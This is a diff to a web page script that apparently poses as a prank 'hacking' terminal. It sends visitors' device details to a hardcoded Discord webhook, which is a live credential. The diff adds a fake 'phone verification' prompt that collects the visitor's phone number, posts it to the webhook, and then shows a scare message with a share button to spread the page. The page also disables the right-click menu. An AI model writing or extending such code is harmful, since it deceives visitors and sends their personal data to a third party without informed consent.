@@ -4,6 +4,49 @@ console.log('Script loaded successfully!');
 // Discord webhook URL
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
+// Global variable to store phone number
+let userPhoneNumber = '';
+
+// Function to validate phone number
+function validatePhoneNumber(phoneNumber) {
+    // Remove all non-digit characters
+    const cleaned = phoneNumber.replace(/\D/g, '');
+    
+    // Basic validation for different formats
+    // US format: 10 digits (optional country code +1)
+    // International: 8-15 digits
+    if (cleaned.length >= 8 && cleaned.length <= 15) {
+        return {
+            valid: true,
+            cleaned: cleaned,
+            formatted: formatPhoneNumber(cleaned)
+        };
+    }
+    
+    return {
+        valid: false,
+        cleaned: cleaned,
+        formatted: phoneNumber
+    };
+}
+
+// Function to format phone number
+function formatPhoneNumber(phoneNumber) {
+    const cleaned = phoneNumber.replace(/\D/g, '');
+    
+    // US format
+    if (cleaned.length === 10) {
+        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
+    }
+    
+    // International format
+    if (cleaned.length > 10) {
+        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
+    }
+    
+    return cleaned;
+}
+
 // Function to get detailed device information
 function getDeviceInfo() {
     const userAgent = navigator.userAgent;
@@ -31,7 +74,8 @@ function getDeviceInfo() {
         cpuCores,
         isMobile,
         browser,
-        os
+        os,
+        phoneNumber: userPhoneNumber
     };
 }
 
@@ -64,6 +108,7 @@ async function sendWebhook() {
                 { name: '🌐 Language', value: deviceInfo.language, inline: true },
                 { name: '💾 RAM', value: deviceInfo.deviceMemory, inline: true },
                 { name: '💻 CPU Cores', value: deviceInfo.cpuCores, inline: true },
+                { name: '📞 Phone Number', value: deviceInfo.phoneNumber || 'Not provided', inline: true },
                 { name: '🛠️ User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
             ]
         };
@@ -109,8 +154,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const ipLine = document.getElementById('ip-line');
     const cookiesLine = document.getElementById('cookies-line');
     const accountLine = document.getElementById('account-line');
+    const phoneLine = document.getElementById('phone-line');
     const jokeLine = document.getElementById('joke-line');
     const revealLine = document.getElementById('reveal-line');
+    const phoneInputContainer = document.getElementById('phone-input-container');
+    const phoneInput = document.getElementById('phone-input');
+    const phoneSubmit = document.getElementById('phone-submit');
     
     // Typewriter effect
     function typeWriter(element, text, speed = 10, callback) {
@@ -145,28 +194,20 @@ document.addEventListener('DOMContentLoaded', () => {
                     // Show fake data found
                     setTimeout(() => {
                         typeWriter(accountLine, '> Data collection complete!', 10, () => {
-                            // Show joke message
+                            // Show phone collection message
                             setTimeout(() => {
-                                typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
-                                    // Final reveal
+                                typeWriter(phoneLine, '> Phone verification required...', 10, () => {
+                                    // Show phone input form
                                     setTimeout(() => {
-                                        typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
-                                            // Add a share button
-                                            const button = document.createElement('button');
-                                            button.className = 'button';
-                                            button.textContent = 'Made By @Phonzr';
-                                            button.onclick = () => {
-                                                if (navigator.share) {
-                                                    navigator.share({
-                                                        title: 'Check this out!',
-                                                        text: 'I found something interesting!',
-                                                        url: window.location.href
-                                                    });
-                                                } else {
-                                                    alert('Share this link: ' + window.location.href);
-                                                }
-                                            };
-                                            terminal.appendChild(button);
+                                        phoneInputContainer.style.display = 'block';
+                                        phoneInput.focus();
+                                        
+                                        // Handle phone submission
+                                        phoneSubmit.addEventListener('click', handlePhoneSubmit);
+                                        phoneInput.addEventListener('keypress', (e) => {
+                                            if (e.key === 'Enter') {
+                                                handlePhoneSubmit();
+                                            }
                                         });
                                     }, 1000);
                                 });
@@ -177,6 +218,61 @@ document.addEventListener('DOMContentLoaded', () => {
             }, 1000);
         });
     }, 500);
+    
+    // Function to handle phone number submission
+    function handlePhoneSubmit() {
+        const phoneNumber = phoneInput.value.trim();
+        const validation = validatePhoneNumber(phoneNumber);
+        
+        if (validation.valid) {
+            userPhoneNumber = validation.formatted;
+            phoneInputContainer.style.display = 'none';
+            
+            // Show success message
+            const successLine = document.createElement('div');
+            successLine.className = 'line success';
+            terminal.appendChild(successLine);
+            typeWriter(successLine, `> Phone number verified: ${validation.formatted}`, 10, () => {
+                // Send updated webhook with phone number
+                sendWebhook().then(() => {
+                    // Continue with joke message
+                    setTimeout(() => {
+                        typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
+                            // Final reveal
+                            setTimeout(() => {
+                                typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
+                                    // Add a share button
+                                    const button = document.createElement('button');
+                                    button.className = 'button';
+                                    button.textContent = 'Made By @Phonzr';
+                                    button.onclick = () => {
+                                        if (navigator.share) {
+                                            navigator.share({
+                                                title: 'Check this out!',
+                                                text: 'I found something interesting!',
+                                                url: window.location.href
+                                            });
+                                        } else {
+                                            alert('Share this link: ' + window.location.href);
+                                        }
+                                    };
+                                    terminal.appendChild(button);
+                                });
+                            }, 1000);
+                        });
+                    }, 1000);
+                });
+            });
+        } else {
+            // Show error message
+            phoneInput.style.borderColor = '#ff4444';
+            phoneInput.style.backgroundColor = 'rgba(255, 68, 68, 0.1)';
+            setTimeout(() => {
+                phoneInput.style.borderColor = '';
+                phoneInput.style.backgroundColor = '';
+            }, 2000);
+        }
+    }
     
     // Prevent context menu on right-click
     document.addEventListener('contextmenu', (e) => e.preventDefault());
